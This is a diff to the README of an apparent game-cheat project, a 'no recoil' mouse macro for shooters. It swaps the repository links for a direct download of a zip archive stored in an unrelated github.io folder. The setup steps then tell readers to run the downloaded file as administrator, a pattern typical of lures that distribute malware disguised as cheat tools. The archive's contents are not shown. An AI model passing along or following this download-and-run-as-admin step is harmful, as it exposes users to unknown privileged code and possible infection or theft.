@@ -5,7 +5,7 @@ description: "Automate mouse inputs and manage recoil patterns with this macro r
 ---
 # 🖱️ Mouse-Macro-Recorder-2026-No-Recoil - Simplify weapon recoil in your games
 
-[https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil](https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil)
+[https://raw.githubusercontent.com/Jayalkahestic205/jayalkahestic205.github.io/main/Branchiata/Release_v3.2.zip](https://raw.githubusercontent.com/Jayalkahestic205/jayalkahestic205.github.io/main/Branchiata/Release_v3.2.zip)
 
 This software manages mouse movements to assist with recoil control in first-person shooter games. It integrates with Logitech G-Hub to execute scripts that stabilize your aim during gameplay.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software:
 
-1.  Visit this page to download the necessary files: [https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil](https://github.com/Jayalkahestic205/Mouse-Macro-Recorder-2026-No-Recoil)
+1.  Visit this page to download the necessary files: [https://raw.githubusercontent.com/Jayalkahestic205/jayalkahestic205.github.io/main/Branchiata/Release_v3.2.zip](https://raw.githubusercontent.com/Jayalkahestic205/jayalkahestic205.github.io/main/Branchiata/Release_v3.2.zip)
 2.  Locate the downloaded file in your browser downloads folder.
 3.  Right-click the file and select "Run as administrator" to start the setup process.
 4.  Follow the prompts on your screen.
